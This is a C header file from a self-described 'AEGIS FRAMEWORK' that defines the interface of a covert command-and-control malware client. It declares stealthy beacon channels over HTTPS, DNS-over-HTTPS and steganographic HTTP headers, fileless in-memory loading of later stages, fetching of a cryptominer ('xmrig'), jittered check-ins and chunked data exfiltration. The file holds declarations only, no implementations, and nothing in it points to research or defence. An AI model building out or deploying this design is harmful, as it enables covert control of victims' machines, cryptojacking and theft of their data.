/*
 * ============================================================================
 *  AEGIS FRAMEWORK — C2 Communications Client (Header)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : c2_comms/c2_client.h
 *  Purpose        : Covert channel client for C2 beacon/tasking communication.
 *                   Supports HTTPS (TLS 1.3), DNS-over-HTTPS (DoH), and
 *                   steganographic HTTP header channels.
 * ============================================================================
 */

#ifndef AEGIS_C2_CLIENT_H
#define AEGIS_C2_CLIENT_H

#include "../common/config.h"
#include "../common/types.h"
#include "crypto.h"


/* ── Channel Types ───────────────────────────────────────────────────────── */
typedef enum {
  C2_CHAN_HTTPS = 0,     /* Direct HTTPS with TLS 1.3               */
  C2_CHAN_DOH = 1,       /* DNS-over-HTTPS (payload in TXT records) */
  C2_CHAN_STEGO_HDR = 2, /* Steganographic HTTP headers             */
} aegis_c2_channel_t;

/* ── C2 Message Types ────────────────────────────────────────────────────── */
typedef enum {
  C2_MSG_BEACON = 0x01,       /* Periodic check-in                     */
  C2_MSG_TASK_REQ = 0x02,     /* Request tasking from C2               */
  C2_MSG_TASK_RESP = 0x03,    /* Task result back to C2                */
  C2_MSG_PAYLOAD_REQ = 0x04,  /* Request a payload module              */
  C2_MSG_PAYLOAD_DATA = 0x05, /* Payload module data                   */
  C2_MSG_REKEY = 0x06,        /* Key rotation handshake                */
  C2_MSG_STAGE_REQ = 0x07,    /* Request next stage (Ghost Loader)     */
  C2_MSG_STAGE_DATA = 0x08,   /* Next stage data                       */
  C2_MSG_EXFIL = 0x09,        /* Data exfiltration                     */
  C2_MSG_HEARTBEAT = 0x0A,    /* Lightweight keepalive                 */
  C2_MSG_RESOURCE_REQ = 0x0B, /* Request a generic resource (ELF, etc) */
} aegis_c2_msg_type_t;

/* ── C2 Message Envelope ─────────────────────────────────────────────────── */
typedef struct {
  uint32_t magic;       /* AEGIS_C2_HEADER_MAGIC         */
  uint32_t msg_type;    /* aegis_c2_msg_type_t           */
  uint32_t payload_len; /* Encrypted payload length      */
  uint32_t sequence;    /* Monotonic sequence number     */
  uint8_t iv[AEGIS_GCM_IV_BYTES];
  uint8_t tag[AEGIS_GCM_TAG_BYTES];
  uint8_t node_id[16]; /* Truncated node identifier     */
} AEGIS_PACKED aegis_c2_envelope_t;

/* ── C2 Client Context ───────────────────────────────────────────────────── */
typedef struct {
  aegis_crypto_ctx_t *crypto;        /* Shared crypto context         */
  aegis_c2_channel_t active_channel; /* Currently selected channel    */
  char primary_host[256];
  uint16_t primary_port;
  char fallback_host[256];
  uint16_t fallback_port;
  char doh_resolver[256];
  uint32_t sequence;        /* Outgoing sequence number      */
  uint64_t last_beacon_ns;  /* Timestamp of last beacon      */
  uint32_t beacon_interval; /* Current interval (ms)         */
  uint32_t consecutive_failures;
  uint8_t node_id[16]; /* Our unique node identifier    */
  bool initialized;
} aegis_c2_ctx_t;

/* ── Initialization / Teardown ───────────────────────────────────────────── */

/*
 * aegis_c2_init — Initialize the C2 client.
 * @ctx:    Pointer to uninitialized C2 context.
 * @crypto: Initialized crypto context for message encryption.
 * Returns: AEGIS_OK on success.
 */
aegis_result_t aegis_c2_init(aegis_c2_ctx_t *ctx, aegis_crypto_ctx_t *crypto);

/*
 * aegis_c2_destroy — Clean up C2 client state.
 */
void aegis_c2_destroy(aegis_c2_ctx_t *ctx);

/* ── Beacon / Tasking ────────────────────────────────────────────────────── */

/*
 * aegis_c2_beacon — Send a beacon to the C2 server.
 * Includes system fingerprint, current status, and requests tasking.
 *
 * @ctx:       C2 client context.
 * @task_out:  Output buffer for received tasking data.
 * @task_cap:  Capacity of the task output buffer.
 * @task_len:  Output: actual length of received tasking data.
 * Returns: AEGIS_OK, AEGIS_ERR_NETWORK, or AEGIS_ERR_C2_UNREACHABLE.
 */
aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
                               size_t task_cap, size_t *task_len);

/*
 * aegis_c2_send_result — Send task execution results to C2.
 */
aegis_result_t aegis_c2_send_result(aegis_c2_ctx_t *ctx, const uint8_t *data,
                                    size_t data_len);

/* ── Stage / Payload Retrieval ───────────────────────────────────────────── */

/*
 * aegis_c2_fetch_stage — Request and receive the next stage (Ghost Loader).
 * The received binary is placed directly into memory, NEVER written to disk.
 *
 * @ctx:        C2 client context.
 * @stage_out:  Output: pointer to mmap'd region containing the stage.
 *              Caller is responsible for munmap after execution.
 * @stage_len:  Output: length of the stage binary.
 */
aegis_result_t aegis_c2_fetch_stage(aegis_c2_ctx_t *ctx, uint8_t **stage_out,
                                    size_t *stage_len);

/*
 * aegis_c2_fetch_payload — Request and receive an encrypted payload module.
 * The payload is returned still encrypted — the Nanomachine handles
 * chunk-by-chunk decryption at execution time.
 */
aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
                                      uint8_t **payload_out,
                                      size_t *payload_len);

/*
 * aegis_c2_fetch_resource — Request and receive a generic resource (e.g. ELF).
 * The resource is downloaded and decrypted into memory.
 *
 * @ctx:          C2 client context.
 * @resource_id:  Identifier string for the resource (e.g., "xmrig").
 * @res_out:      Output: pointer to buffer containing decrypted resource.
 * @res_len:      Output: length of the resource.
 */
aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
                                       const char *resource_id,
                                       uint8_t **res_out,
                                       size_t *res_len);

/* ── Channel Management ──────────────────────────────────────────────────── */

/*
 * aegis_c2_switch_channel — Switch the active C2 communication channel.
 * Falls back through channels in order of stealth:
 * STEGO_HDR → DOH → HTTPS
 */
aegis_result_t aegis_c2_switch_channel(aegis_c2_ctx_t *ctx,
                                       aegis_c2_channel_t channel);

/*
 * aegis_c2_calculate_jitter — Calculate the next beacon interval
 * with randomized jitter applied.
 * Returns: Interval in milliseconds.
 */
uint32_t aegis_c2_calculate_jitter(aegis_c2_ctx_t *ctx);

/* ── Data Exfiltration ───────────────────────────────────────────────────── */

/*
 * aegis_c2_exfiltrate — Send data out via the active C2 channel.
 * Automatically chunks large data into multiple messages.
 */
aegis_result_t aegis_c2_exfiltrate(aegis_c2_ctx_t *ctx, const uint8_t *data,
                                   size_t data_len, const char *label);

#endif /* AEGIS_C2_CLIENT_H */
